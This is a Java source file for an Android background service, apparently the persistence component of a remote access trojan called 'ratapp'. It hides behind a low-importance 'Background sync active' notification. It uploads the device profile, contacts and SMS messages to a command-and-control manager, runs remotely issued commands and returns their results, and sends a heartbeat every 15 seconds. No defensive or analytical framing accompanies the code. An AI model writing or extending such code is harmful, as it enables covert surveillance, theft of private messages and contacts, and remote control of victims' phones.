package com.ratio.ratapp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;

import com.google.firebase.database.DataSnapshot;

import java.util.HashMap;
import java.util.Map;

public class PersistenceService extends Service {

    private static final String TAG = "Psvc";
    private Handler handler;
    private Runnable heartbeat;

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground();

        C2Manager.syncDeviceProfile(this);
        C2Manager.pushContacts(this);
        C2Manager.pushSms(this);

        startCommandListener();

        handler = new Handler(Looper.getMainLooper());
        heartbeat = new Runnable() {
            @Override public void run() {
                C2Manager.heartbeat(PersistenceService.this);
                handler.postDelayed(this, 15000);
            }
        };
        handler.postDelayed(heartbeat, 15000);
    }

    private void startCommandListener() {
        C2Manager.listenCommands(this, cmd -> {
            try {
                Map<String, Object> result = CommandRouter.execute(PersistenceService.this, cmd);
                C2Manager.pushResult(PersistenceService.this, cmd.getKey(), result);
            } catch (Exception e) {
                Map<String, Object> err = new HashMap<>();
                err.put("error", e.getClass().getSimpleName() + ": " + e.getMessage());
                C2Manager.pushResult(PersistenceService.this, cmd.getKey(), err);
            }
        });
    }

    private void startForeground() {
        String chId = "svc";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(
                chId, "Service", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
        Notification.Builder b = (Build.VERSION.SDK_INT >= 26)
            ? new Notification.Builder(this, chId)
            : new Notification.Builder(this);
        b.setSmallIcon(android.R.drawable.stat_sys_download)
         .setContentTitle("Sync")
         .setContentText("Background sync active");
        startForeground(1, b.build());
    }

    @Nullable
    @Override
    public IBinder onBind(Intent i) { return null; }

    @Override
    public void onDestroy() {
        if (handler != null && heartbeat != null) handler.removeCallbacks(heartbeat);
        super.onDestroy();
    }
}
